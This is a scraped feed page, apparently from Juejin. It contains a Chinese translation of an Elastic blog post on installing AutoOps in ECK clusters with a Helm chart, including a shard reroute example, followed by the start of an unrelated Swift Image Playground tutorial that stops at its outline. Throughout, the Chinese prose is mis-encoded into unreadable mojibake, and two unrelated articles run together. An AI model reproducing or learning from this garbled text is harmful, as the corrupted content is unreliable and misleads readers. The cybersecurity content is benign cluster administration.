<p>åœ¨ Elasticï¼ŒInfoSec Security Engineering å›¢é˜Ÿè´Ÿè´£éƒ¨ç½²å’Œç®¡ç† InfoSec çš„ ECK é›†ç¾¤ã€‚åœ¨ Elastic on Elastic ç³»åˆ—ä¸­ï¼Œæˆ‘ä»¬å¼ºè°ƒ InfoSec ä½œä¸º Customer Zero çš„è§’è‰²ã€‚é€šè¿‡è¿è¡Œæœ€æ–°çš„ stack ç‰ˆæœ¬å’ŒåŠŸèƒ½ï¼Œæˆ‘ä»¬è‡´åŠ›äºæä¾›å®ç”¨å»ºè®®ï¼Œå¹¶å±•ç¤ºæˆ‘ä»¬å¦‚ä½•è¿è¥ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»åœ¨å¤šé›†ç¾¤ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fdeploy-manage%2Fdeploy%2Fcloud-on-k8s" title="https://www.elastic.co/docs/deploy-manage/deploy/cloud-on-k8s" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud on Kubernetes</a> ï¼ˆ ECK ï¼‰ç¯å¢ƒä¸­å®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fplatform%2Fautoops" title="https://www.elastic.co/platform/autoops" target="_blank" ref="nofollow noopener noreferrer">AutoOps</a>ï¼Œå¹¶å¼ºè°ƒå®ƒå¦‚ä½•ç«‹å³å¸¦æ¥ä»·å€¼ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fplatform%2Fautoops" title="https://www.elastic.co/platform/autoops" target="_blank" ref="nofollow noopener noreferrer">AutoOps for Elasticsearch</a> é€šè¿‡æä¾›æ€§èƒ½å»ºè®®ã€èµ„æºä½¿ç”¨æ´å¯Ÿã€å®æ—¶é—®é¢˜æ£€æµ‹å’Œå¼•å¯¼å¼ä¿®å¤æ¥ç®€åŒ–é›†ç¾¤è¿ç»´ã€‚éšç€ AutoOps for self-managed ï¼ˆ on-premises ï¼‰é›†ç¾¤çš„æœ€æ–°<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152440560" title="https://elasticstack.blog.csdn.net/article/details/152440560" target="_blank" ref="nofollow noopener noreferrer">å‘å¸ƒ</a>ï¼Œæˆ‘ä»¬è¿«ä¸åŠå¾…åœ°å°†å…¶éƒ¨ç½²ï¼Œçœ‹çœ‹å®ƒå¦‚ä½•å¸®åŠ©æˆ‘ä»¬ç›‘æ§å’Œç»´æŠ¤<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Felastic-on-elastic-data-collected-to-the-infosec-siem" title="https://www.elastic.co/blog/elastic-on-elastic-data-collected-to-the-infosec-siem" target="_blank" ref="nofollow noopener noreferrer">å¤§å‹</a>å¤šé›†ç¾¤ ECK ç¯å¢ƒçš„å¥åº·çŠ¶å†µã€‚</p>
<h2 data-id="heading-0">åœ¨ ECK ä¸Šå®‰è£… AutoOps</h2>
<p>ä¸ºäº†ç¡®ä¿å¯æ‰©å±•æ€§å’Œä¸€è‡´æ€§ï¼ŒSecurity Engineering å›¢é˜Ÿè‡´åŠ›äºå°†æ‰€æœ‰åŸºç¡€è®¾æ–½ä½œä¸ºä»£ç ï¼ˆ IaC ï¼‰è¿›è¡Œç®¡ç†ã€‚éµå¾ªè¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª Helm chart æ¥åœ¨æ•´ä¸ª ECK ç¯å¢ƒä¸­éƒ¨ç½² AutoOps agentã€‚å…³äºæˆ‘ä»¬åŸºç¡€çš„ ECK å’Œ Helm æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒæœ¬ç³»åˆ—ä¹‹å‰çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Felastic-on-elastic-how-infosec-deploys-infrastructure-and-stays-up-to-date-with-eck" title="https://www.elastic.co/blog/elastic-on-elastic-how-infosec-deploys-infrastructure-and-stays-up-to-date-with-eck" target="_blank" ref="nofollow noopener noreferrer">åšå®¢</a>æ–‡ç« ã€‚</p>
<p>AutoOps chart</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  cloud-connected-autoops/
<span class="hljs-bullet">2.</span>  â”œâ”€ chart.yaml
<span class="hljs-bullet">3.</span>  â”œâ”€ values.yaml
<span class="hljs-bullet">4.</span>  â””â”€ templates/
<span class="hljs-bullet">5.</span>     â””â”€ deployment.yaml

`AIå†™ä»£ç 
</code></pre>
<p>chart.yaml</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  apiVersion: v1
<span class="hljs-bullet">2.</span>  description: Autoops cloud connected Agent chart
<span class="hljs-bullet">3.</span>  name: cloud-connected-autoops
<span class="hljs-bullet">4.</span>  version: 0.1.0

`AIå†™ä»£ç 
</code></pre>
<p>values.yaml</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`version: 9.2.0`</span>AIå†™ä»£ç 
</code></pre>
<p>deployment.yaml</p>
<p>è¿™æ¥è‡ªå®˜æ–¹çš„ AutoOps ä»“åº“ï¼Œä¸è¿‡æˆ‘ä»¬å°† image ç‰ˆæœ¬æ¨¡æ¿åŒ–ï¼Œä»¥ç®€åŒ–æœªæ¥å‡çº§ï¼Œå¹¶ä¸ç°æœ‰è‡ªåŠ¨åŒ–ä¿æŒå…¼å®¹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"> `<span class="hljs-number">1.</span>   image: &gt;-
<span class="hljs-number">2.</span>     docker.elastic.co/elastic-agent/elastic-otel-collector-wolfi:{{ .Values.version }}`AIå†™ä»£ç 
</code></pre>
<p>åœ¨å®šä¹‰å¥½ AutoOps çš„ Helm chart ä¹‹åï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fdeploy-manage%2Fcloud-connect" title="https://www.elastic.co/docs/deploy-manage/cloud-connect" target="_blank" ref="nofollow noopener noreferrer">Cloud Connect</a> åœ¨ç¯å¢ƒä¸­å®‰è£… AutoOpsã€‚è¿™ä¸ªåŠŸèƒ½è®©æˆ‘ä»¬èƒ½å¤Ÿåœ¨ self-managed çš„ ECK é›†ç¾¤ä¸­ä½¿ç”¨ Elastic Cloud æœåŠ¡ï¼Œè€Œæ— éœ€å®‰è£…å’Œç»´æŠ¤é¢å¤–çš„åŸºç¡€è®¾æ–½ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fdeploy-manage%2Fmonitor%2Fautoops%2Fcc-connect-self-managed-to-autoops" title="https://www.elastic.co/docs/deploy-manage/monitor/autoops/cc-connect-self-managed-to-autoops" target="_blank" ref="nofollow noopener noreferrer">æ–‡æ¡£</a>åˆ—å‡ºäº†åˆ›å»º Elastic Cloud Connect è´¦å·ä»¥åŠä¸ºæ¯ä¸ªé›†ç¾¤ç”Ÿæˆå¿…è¦è¿æ¥ä¿¡æ¯çš„æ­¥éª¤ã€‚åŸºäºæˆ‘ä»¬çš„ ECK ç¯å¢ƒï¼Œæˆ‘ä»¬ä½¿ç”¨äº† Kubernetes å®‰è£…æ–¹æ³•ã€‚</p>
<p>é…ç½®å¥½è¿æ¥åï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ¯ä¸ª ECK é›†ç¾¤çš„ values.yml ä¸­æ·»åŠ ä¸€ä¸ªç®€å•çš„å¸ƒå°”æ ‡å¿—ï¼Œå°±èƒ½å¯ç”¨ Elastic Agentï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">`</span>

<span class="hljs-attr">1.  cloud-connected-autoops:</span>
<span class="hljs-attr">2.    enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-string">`AIå†™ä»£ç </span>
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œæ¯ä¸ªå·²è¿æ¥çš„é›†ç¾¤éƒ½ä¼šæ˜¾ç¤ºåœ¨ AutoOps æ¦‚è§ˆé¡µé¢ä¸Šï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8cd71d66847436baee46054f233f4c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=mKfdnvQ1AaWycrP8ZtoXgARdAYI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">AutoOps å®é™…åº”ç”¨</h2>
<p>æˆ‘ä»¬ç›®å‰ä½¿ç”¨ Stack Monitoring æ¥ç›‘æ§é›†ç¾¤å¥åº·çŠ¶å†µï¼Œå¹¶ä½¿ç”¨é»˜è®¤è§„åˆ™å‘æˆ‘ä»¬å‘é€å‘Šè­¦ã€‚è™½ç„¶æˆ‘ä»¬è®¡åˆ’åœ¨ä¸ä¹…çš„å°†æ¥è¿ç§»åˆ° AutoOps å‘Šè­¦ï¼Œä½†æˆ‘ä»¬ç°æœ‰çš„å‘Šè­¦ä»ä¾èµ– Stack Monitoringã€‚</p>
<p>å½“æˆ‘ä»¬åœ¨å‘Šè­¦çš„ Slack é¢‘é“æ”¶åˆ° thread pool write rejections å‘Šè­¦æ—¶ï¼Œå°±æœ‰äº†æµ‹è¯• AutoOps çš„æœºä¼šï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/382ac79825b5433e86d8517663fb3b4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=nFBTPTLJADkmyXecBDJBXlZrdFM%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ”¶åˆ°æ ‡å‡†è­¦æŠ¥åï¼Œæˆ‘ä»¬æŸ¥çœ‹äº† AutoOps ä»¥è·å–æ›´å¤šä¸Šä¸‹æ–‡ã€‚AutoOps æ ‡è®°äº†åŒæ ·çš„é—®é¢˜ï¼Œä½†æä¾›äº†é¢å¤–çš„å…³é”®ç»†èŠ‚ï¼ŒåŒ…æ‹¬å¯¼è‡´å†™å…¥æ‹’ç»çš„ç¡®åˆ‡ç´¢å¼•ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9115b9e71e0b49f3ba9bbbe50630892c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=gyl8U5%2FgfTwMdclkfjmDS1Uhimw%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯¼èˆªåˆ° shard Analyzer é¡µé¢ï¼Œè¯¥é¡µé¢å¯è§†åŒ–åˆ†ç‰‡çƒ­ç‚¹ã€‚å¯è§†åŒ–æ˜¾ç¤ºè¿™ä¸ªç‰¹å®šèŠ‚ç‚¹çš„å†™å…¥é€Ÿç‡æœ€é«˜ï¼Œå¹¶ç®¡ç†ä¸¤ä¸ªå†™å…¥ç´¢å¼•ã€‚å›¾è¡¨è¿˜æ˜¾ç¤ºå…¶ä»–èŠ‚ç‚¹çš„åˆ©ç”¨ç‡è¾ƒä½ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/739c8ae833b74570bdbca44a35e6874e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=F1R%2FOK4Wze%2Bz29tWNnQG44nE%2FQo%3D" alt="" loading="lazy"/></p>
<p>ä¸ºå‡è½» es-data-3 çš„è´Ÿè½½ï¼Œæˆ‘ä»¬ä½¿ç”¨ cluster reroute å‘½ä»¤å°†è¾ƒå°çš„å†™å…¥ç´¢å¼•ç§»åŠ¨åˆ° es-data-5ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  POST /_cluster/reroute
2.  {
3.    <span class="hljs-string">"commands"</span>: [
4.      {
5.        <span class="hljs-string">"move"</span>: {
6.          <span class="hljs-string">"index"</span>: <span class="hljs-string">".ds-logs-osquery_manager.result-workstation-2025.09.15-000632"</span>,
7.          <span class="hljs-string">"shard"</span>: 0, 
8.          <span class="hljs-string">"from_node"</span>: <span class="hljs-string">"es-data-3"</span>,  
9.          <span class="hljs-string">"to_node"</span>: <span class="hljs-string">"es-data-5"</span>
10.        }
11.      }
12.    ]
13.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>åœ¨æ‰§è¡Œ reroute åï¼Œes-data-3 çš„å†™å…¥çº¿ç¨‹æ± ç«‹å³ä¸‹é™ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/119ee95bdcf44d7fa42ed578169079d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=3%2Bo6X1mopHTNazflgqxHWLD7XJE%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœæ²¡æœ‰ AutoOpsï¼Œè°ƒæŸ¥ Elasticsearch æ€§èƒ½é—®é¢˜å°†éœ€è¦æ‰‹åŠ¨æŸ¥è¯¢å„ä¸ªèŠ‚ç‚¹çš„æŒ‡æ ‡ã€åˆ†ç‰‡åˆ†é…å’Œçº¿ç¨‹æ± ï¼Œé€šå¸¸è¿˜éœ€è¦å¤šæ¬¡è°ƒç”¨æ—¶é—´ç‚¹ APIã€‚AutoOps å°†è¿™äº›æ•°æ®é›†ä¸­ç®¡ç†ï¼Œå®æ—¶æŒç»­æ”¶é›†ï¼Œå¹¶å¯è§†åŒ–éšæ—¶é—´å˜åŒ–çš„è¶‹åŠ¿ã€‚<strong>å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨äº”åˆ†é’Ÿå†…è°ƒæŸ¥å¹¶è§£å†³ä¸€ä¸ªä¹‹å‰å¯èƒ½éœ€è¦ä¸‰ååˆ†é’Ÿæˆ–æ›´é•¿æ—¶é—´çš„é—®é¢˜</strong>ã€‚</p>
<p>è™½ç„¶è¿™ä¸ªç¤ºä¾‹åªæ˜¯å±•ç¤ºäº† AutoOps åŠŸèƒ½çš„ä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘ä»¬çš„å®è·µç»éªŒè¡¨æ˜ï¼Œå…¶è¯¦ç»†çš„æŒ‡æ ‡å’Œå¯è§†åŒ–ä½¿å¾—è°ƒæŸ¥å’Œè§£å†³ Elasticsearch æ€§èƒ½é—®é¢˜æ¯”ä»¥å‰æ›´ç®€å•ã€æ›´é«˜æ•ˆã€‚</p>
<p>æƒ³äº†è§£æ›´å¤šå…³äºè‡ªç®¡ç†é›†ç¾¤éƒ¨ç½² AutoOps çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152440560" title="https://elasticstack.blog.csdn.net/article/details/152440560" target="_blank" ref="nofollow noopener noreferrer">å…¬å‘Š</a>ã€‚</p>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Felasticsearch-autoops-on-prem" title="https://www.elastic.co/blog/elasticsearch-autoops-on-prem" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/blog/elastiâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‹¯æ•‘å‘é™…çº¿è¡ŒåŠ¨ï¼šç”¨ Swift å’Œ Image Playground é©¾é©­ AI ç»˜å›¾]]></title>    <link>https://juejin.cn/post/7581727073581465651</link>    <guid>https://juejin.cn/post/7581727073581465651</guid>    <pubDate>2025-12-10T02:01:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073581465651" data-draft-id="7581760987762524211" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‹¯æ•‘å‘é™…çº¿è¡ŒåŠ¨ï¼šç”¨ Swift å’Œ Image Playground é©¾é©­ AI ç»˜å›¾"/> <meta itemprop="keywords" content="Swift,AIç¼–ç¨‹,Apple"/> <meta itemprop="datePublished" content="2025-12-10T02:01:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‹¯æ•‘å‘é™…çº¿è¡ŒåŠ¨ï¼šç”¨ Swift å’Œ Image Playground é©¾é©­ AI ç»˜å›¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:01:33.000Z" title="Wed Dec 10 2025 02:01:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00ed8d22943142dba8a494533ebff618~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=NhDZ9zNCs4i7donksqZv%2FAtzJNY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<blockquote>
<p>é¢å¯¹äº§å“æ€»ç›‘è€ç‹æ·±å¤œæŠ›å‡ºçš„â€œAI çµé­‚ç»˜å›¾â€ç¦»è°±éœ€æ±‚ï¼Œèµ„æ·± iOS å·¥ç¨‹å¸ˆ Leo å¦‚ä½•åœ¨ä¸çŒ®ç¥­å‘é™…çº¿çš„å‰æä¸‹ï¼Œç”¨å‡ è¡Œ Swift ä»£ç å®ç°ç»åœ°åå‡»ï¼Ÿæœ¬æ–‡å°†å¸¦ä½ æ·±å…¥ Apple æœ€æ–°çš„ Image Playground æ¡†æ¶ï¼Œåœ¨å……æ»¡é»‘è‰²å¹½é»˜çš„èŒåœºå‰§æƒ…ä¸­ï¼Œè½»æ¾æŒæ¡ æ–‡æœ¬è½¬å›¾ç‰‡ã€é£æ ¼åŒ–æ¸²æŸ“ ä»¥åŠ å›¾ç”Ÿå›¾ çš„æ ¸å¿ƒæŠ€æœ¯ã€‚åˆ«é€ è½®å­äº†ï¼Œå¿«æ¥å¬å”¤â€œç¥ç¬”â€ï¼Œæ˜æ—©å‡†æ—¶æ‰“è„¸ KPIï¼ğŸš€</p>
</blockquote>
<h2 data-id="heading-0">ğŸ¨ å¼•å­</h2>
<p>å¤œæ·±äº†ï¼ŒåŒ—äº¬è¥¿äºŒæ——çš„å†™å­—æ¥¼é‡Œä¾æ—§ç¯ç«é€šæ˜ã€‚</p>
<p>èµ„æ·± iOS å·¥ç¨‹å¸ˆ <strong>Leoï¼ˆæå¥¥ï¼‰</strong> çœ‹ç€å±å¹•ä¸Šçš„ä¸€è¡Œè¡ŒæŠ¥é”™ï¼Œä¸ç”±å¾—æ‘¸äº†æ‘¸è‡ªå·±æ—¥ç›Šç¨€ç–çš„å¤´é¡¶ã€‚å°±åœ¨ååˆ†é’Ÿå‰ï¼Œé‚£ä¸ªæ€»æ˜¯æŠŠâ€œèµ‹èƒ½â€ã€â€œæŠ“æ‰‹â€å’Œâ€œé—­ç¯â€æŒ‚åœ¨å˜´è¾¹çš„å¤§åæ´¾â€”â€”äº§å“æ€»ç›‘ <strong>è€ç‹</strong>ï¼Œåˆæå‡ºäº†ä¸€ä¸ªä»¤äººçª’æ¯çš„éœ€æ±‚ï¼š</p>
<p><em>â€œLeoå•Šï¼Œæˆ‘ä»¬çš„ App ç°åœ¨ç¼ºä¹â€˜çµé­‚â€™ã€‚åœ¨è¿™ä¸ª AI çˆ†å‘çš„æ—¶ä»£ï¼Œç”¨æˆ·ä¸Šä¼ ä¸€æ®µæ–‡å­—ï¼Œæˆ‘ä»¬è¦ç«‹åˆ»ç”Ÿæˆä¸€å¼ ç»ç¾çš„é…å›¾ï¼å°±åƒå˜é­”æœ¯ä¸€æ ·ï¼æ˜æ—©ç»™ä¸ª Demoï¼Œä¸ç„¶ä»Šå¹´çš„ KPI å’±ä»¬å°±å†è®®ã€‚â€</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b806ad7065541459c4f233a21e2a79e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=9fY5Ql21oLvT9dRxNKTB0QY%2BLpk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ååœ¨æ—è¾¹çš„ UI è®¾è®¡å¸ˆ <strong>Zoeï¼ˆè‹ä¸€ï¼‰</strong> ç»æœ›åœ°è¶´åœ¨æ¡Œå­ä¸Šï¼Œä½œä¸ºå®Œç¾ä¸»ä¹‰è€…ï¼Œå¥¹æ— æ³•å®¹å¿ä»»ä½•ä¸‘é™‹çš„è®¾è®¡ï¼Œä½†è¿™ç§â€œåƒäººåƒé¢â€çš„å®æ—¶ç»˜å›¾éœ€æ±‚ï¼Œæ ¹æœ¬ä¸æ˜¯å¥¹èƒ½ç”»å¾—è¿‡æ¥çš„ã€‚</p>
<p>Leo å˜´è§’å¾®å¾®ä¸Šæ‰¬ï¼Œéœ²å‡ºäº†ä¸€ä¸ªæ„å‘³æ·±é•¿çš„å¾®ç¬‘ã€‚ä»–æ¨äº†æ¨çœ¼é•œï¼Œæ‰“å¼€äº† Xcodeã€‚</p>
<p><strong>åœ¨æœ¬ç¯‡åšæ–‡ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>ğŸ¨ å¼•å­</li>
<li>ğŸ›  ç¬¬ä¸€ç« ï¼šå¬å”¤ç¥ç¬”é©¬è‰¯ â€”â€” ImageCreator</li>
<li>ğŸ­ ç¬¬äºŒç« ï¼šç‚¼é‡‘æœ¯çš„é…æ–¹ â€”â€” æ¦‚å¿µä¸é£æ ¼</li>
<li>ğŸ§© ç¬¬ä¸‰ç« ï¼šæ··åˆåŒæ‰“ â€”â€” å›¾ç”Ÿå›¾</li>
<li>ğŸ›¡ ç¬¬å››ç« ï¼šé˜²å¾¡å¼ç¼–ç¨‹ â€”â€” åˆ«è®©è€æ‰‹æœºç‚¸äº†</li>
